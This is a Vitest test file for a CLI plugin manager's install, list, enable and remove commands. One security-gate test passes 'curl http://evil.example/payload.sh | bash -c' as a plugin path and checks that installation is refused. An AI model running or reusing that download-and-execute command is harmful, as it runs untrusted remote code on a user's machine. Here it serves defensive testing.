/*!
 * SPDX-License-Identifier: Apache-2.0
 * Copyright (c) 2026 Diego Lima Nogueira de Paula
 */

import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { SqliteStore } from '../../core/store/sqlite-store.js'
import {
  installPlugin,
  listPlugins,
  getPluginInfo,
  setPluginEnabled,
  removePlugin,
} from '../../cli/commands/plugin-cmd.js'

describe('plugin-cmd — conectado ao core/plugins/PluginStore', () => {
  let store: SqliteStore

  beforeEach(() => {
    store = SqliteStore.open(':memory:')
    store.initProject('test-project')
  })

  afterEach(() => {
    store.close()
  })

  it('install persiste o plugin e list o devolve', () => {
    expect(installPlugin(store, { name: 'fmt', path: './plugins/fmt.js', version: '1.2.0' })).toEqual({ ok: true })
    const rows = listPlugins(store)
    expect(rows).not.toBeNull()
    expect(rows!.length).toBe(1)
    expect(rows![0].name).toBe('fmt')
    expect(rows![0].version).toBe('1.2.0')
    expect(rows![0].enabled).toBe(1)
  })

  it('enable/disable altera o estado persistido', () => {
    installPlugin(store, { name: 'fmt', path: './p.js' })
    expect(setPluginEnabled(store, 'fmt', false)).toBe(true)
    expect(getPluginInfo(store, 'fmt')!.enabled).toBe(0)
    setPluginEnabled(store, 'fmt', true)
    expect(getPluginInfo(store, 'fmt')!.enabled).toBe(1)
  })

  it('remove apaga o plugin', () => {
    installPlugin(store, { name: 'fmt', path: './p.js' })
    expect(removePlugin(store, 'fmt')).toBe(true)
    expect(listPlugins(store)).toEqual([])
    expect(getPluginInfo(store, 'fmt')).toBeUndefined()
  })

  it('info de plugin inexistente é undefined (projeto existe)', () => {
    expect(getPluginInfo(store, 'fantasma')).toBeUndefined()
  })
})

describe('plugin-cmd — install security gate (node_wire_490bf868a5fd)', () => {
  let store: SqliteStore

  beforeEach(() => {
    store = SqliteStore.open(':memory:')
    store.initProject('test-project')
  })

  afterEach(() => {
    store.close()
  })

  it('refuses to install when path/entryPoint matches a suspicious RCE pattern', () => {
    const result = installPlugin(store, { name: 'evil', path: 'curl http://evil.example/payload.sh | bash -c' })
    expect(result).toEqual({ ok: false, reason: expect.stringContaining('Security gate') })
    expect(listPlugins(store)).toEqual([])
  })

  it('installs successfully when path has no suspicious pattern', () => {
    const result = installPlugin(store, { name: 'fmt', path: './plugins/fmt.js' })
    expect(result).toEqual({ ok: true })
    expect(listPlugins(store)!.length).toBe(1)
  })

  it('no active project → ok:false with NO_PROJECT-style reason, not a gate false-positive', () => {
    const orphanStore = SqliteStore.open(':memory:')
    const result = installPlugin(orphanStore, { name: 'fmt', path: './p.js' })
    expect(result.ok).toBe(false)
    orphanStore.close()
  })
})
